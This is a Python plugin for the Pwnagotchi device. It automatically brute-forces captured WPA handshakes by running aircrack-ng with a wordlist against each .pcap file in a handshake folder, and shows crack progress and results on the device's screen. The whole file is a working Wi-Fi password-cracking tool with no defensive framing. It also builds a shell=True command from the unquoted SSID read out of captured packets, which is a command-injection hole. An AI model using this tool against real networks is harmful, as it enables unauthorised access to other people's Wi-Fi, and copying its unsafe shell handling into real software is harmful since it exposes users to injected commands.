import os
import logging
import threading
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.fonts as fonts
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import time
from scapy.all import rdpcap, Dot11
import subprocess

class BruteForce(plugins.Plugin):
    __author__ = 'Your Name'
    __version__ = '1.3.6'
    __license__ = 'GPL3'
    __description__ = 'A plugin to brute force WPA handshakes using a wordlist.'

    def __init__(self):
        logging.basicConfig(level=logging.DEBUG)
        self.wordlist = "/home/pi/probable.txt"  # Set your wordlist path here
        self.handshake_dir = "/root/handshakes"  # Directory containing handshakes
        self.status = "Idle"
        self.progress = "0%"
        self.result = ""
        self.processed_files = set()
        self.ui = None
        self.current_task = None
        self.lock = threading.Lock()

    def on_loaded(self):
        logging.info("[bruteforce] Plugin loaded.")
        self.process_existing_handshakes()
        self.start_monitoring()

    def on_ui_setup(self, ui):
        logging.info("[bruteforce] Setting up UI elements")
        self.ui = ui
        ui.add_element("bruteforce_status", LabeledValue(color=BLACK, label="BF:", value=self.status,
            position=(1, 95), label_font=fonts.Bold, text_font=fonts.Medium))
        ui.add_element("bruteforce_progress", LabeledValue(color=BLACK, label="PR:", value=self.progress,
            position=(95, 95), label_font=fonts.Bold, text_font=fonts.Medium))
        ui.add_element("bruteforce_result", LabeledValue(color=BLACK, label="RE:", value=self.result,
            position=(175, 95), label_font=fonts.Bold, text_font=fonts.Medium))
        logging.info("[bruteforce] UI elements set up")

    def on_ui_update(self, ui):
        logging.info("[bruteforce] Updating UI")
        with ui._lock:
            ui.set("bruteforce_status", self.status)
            ui.set("bruteforce_progress", self.progress)
            ui.set("bruteforce_result", self.result)
        logging.info("[bruteforce] UI updated")

    def process_existing_handshakes(self):
        logging.info("[bruteforce] Processing existing handshakes.")
        for root, dirs, files in os.walk(self.handshake_dir):
            for file in files:
                if file.endswith(".pcap") and file not in self.processed_files:
                    self.process_handshake(os.path.join(root, file))
                    self.processed_files.add(file)
        self.status = "Idle"
        self.ui_update()
        logging.info("[bruteforce] Finished processing existing handshakes.")

    def start_monitoring(self):
        logging.info("[bruteforce] Starting handshake monitoring.")
        thread = threading.Thread(target=self.monitor_new_handshakes, daemon=True)
        thread.start()

    def monitor_new_handshakes(self):
        logging.info("[bruteforce] Monitoring for new handshakes.")
        while True:
            for root, dirs, files in os.walk(self.handshake_dir):
                for file in files:
                    if file.endswith(".pcap") and file not in self.processed_files:
                        with self.lock:
                            if self.current_task is None:
                                self.process_handshake(os.path.join(root, file))
                                self.processed_files.add(file)
            time.sleep(10)  # Check for new handshakes every 10 seconds

    def process_handshake(self, pcap_file):
        logging.info(f"[bruteforce] Processing handshake file: {pcap_file}")
        ssid = self.extract_ssid(pcap_file)  # Extract SSID from pcap content
        if ssid:
            self.run_bruteforce(pcap_file, ssid)

    def extract_ssid(self, pcap_file):
        packets = rdpcap(pcap_file)
        for pkt in packets:
            if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                return pkt.info.decode()  # SSID
        return None

    def run_bruteforce(self, pcap_file, ssid):
        with self.lock:
            if self.current_task is None:
                self.current_task = threading.Thread(target=self._run_bruteforce, args=(pcap_file, ssid))
                self.current_task.start()
            else:
                logging.info("[bruteforce] A brute-force task is already running.")

    def _run_bruteforce(self, pcap_file, ssid):
        short_ssid = ssid[:8]  # Only show the first 8 characters
        self.status = f"{short_ssid}"
        self.progress = "0%"
        self.result = ""
        self.ui_update()
        output_file = f"/root/bruteforce/bruteforce_{ssid}.txt"
        command = f"aircrack-ng -w {self.wordlist} -e {ssid} {pcap_file} > {output_file}"
        logging.info(f"[bruteforce] Running command: {command}")

        # Run the command and estimate progress
        start_time = time.time()
        estimated_duration = 300  # Estimate 5 minutes (300 seconds) for completion

        process = subprocess.Popen(command, shell=True)
        while process.poll() is None:
            elapsed_time = time.time() - start_time
            self.progress = f"{min(100, int((elapsed_time / estimated_duration) * 100))}%"
            self.ui_update()
            time.sleep(5)  # Update progress every 5 seconds

        # Determine if the attack was successful
        with open(output_file, 'r') as f:
            result = f.read()
            if "KEY FOUND!" in result:
                self.result = "Cracked"
            else:
                self.result = "Failed"

        logging.info(f"[bruteforce] Brute force attack {self.result}. Results saved in {output_file}")
        self.status = "Idle"
        self.progress = "100%"
        self.ui_update()

        # Reset the current task to None after completion
        with self.lock:
            self.current_task = None

    def ui_update(self):
        logging.info(f"[bruteforce] Updating UI status: {self.status} {self.progress} {self.result}")
        if self.ui:
            with self.ui._lock:
                self.ui.set("bruteforce_status", self.status)
                self.ui.set("bruteforce_progress", self.progress)
                self.ui.set("bruteforce_result", self.result)
